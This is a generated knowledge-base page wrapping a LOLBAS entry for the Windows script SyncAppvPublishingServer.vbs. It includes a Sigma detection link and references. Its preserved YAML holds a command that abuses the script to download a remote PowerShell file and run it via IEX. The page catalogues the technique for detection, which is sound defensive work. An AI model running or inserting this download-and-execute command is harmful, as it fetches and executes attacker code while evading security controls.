---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Syncappvpublishingserver.vbs

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `syncappvpublishingserver.vbs` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/Syncappvpublishingserver.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Syncappvpublishingserver.vbs](../../tools/windows/syncappvpublishingserver.vbs.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | syncappvpublishingserver.vbs |
| name | Syncappvpublishingserver.vbs |
| type | tool |
| source | lolbas |
| url | https://twitter.com/monoxgas/status/895045566090010624 |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@monoxgas'
  Person: Nick Landers
- Handle: '@subtee'
  Person: Casey Smith
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
  Description: Inject PowerShell script code with the provided arguments
  MitreID: T1216.002
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: PowerShell
  Usecase: Use Powershell host invoked from vbs script
Created: 2018-05-25
Description: Script used related to app-v and publishing server
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh.yml
Full_Path:
- Path: C:\Windows\System32\SyncAppvPublishingServer.vbs
Name: Syncappvpublishingserver.vbs
Resources:
- Link: https://twitter.com/monoxgas/status/895045566090010624
- Link: https://twitter.com/subTee/status/855738126882316288
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/Syncappvpublishingserver.yml
```

## Detection / Analysis Notes

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh.yml
```
